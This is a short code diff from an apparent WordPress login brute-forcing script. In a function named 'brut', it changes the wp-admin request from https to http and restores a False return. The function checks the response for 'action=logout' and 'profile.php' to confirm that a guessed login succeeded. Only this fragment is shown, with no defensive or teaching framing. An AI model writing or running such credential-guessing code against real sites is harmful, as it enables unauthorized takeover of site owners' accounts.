@@ -38,13 +38,13 @@ def brut(string):
     '''if s.text.find('action=lostpassword')>0:action=logout
         return False
     else:'''
-    response = s.get('https://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
     #if response.status_code == 200:
     if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
     #if response.text.find('action=lostpassword')<0:
         return True
-    #else:
-        #return False
+    else:
+        return False
     #else:
         #return False
 #action=lostpassword
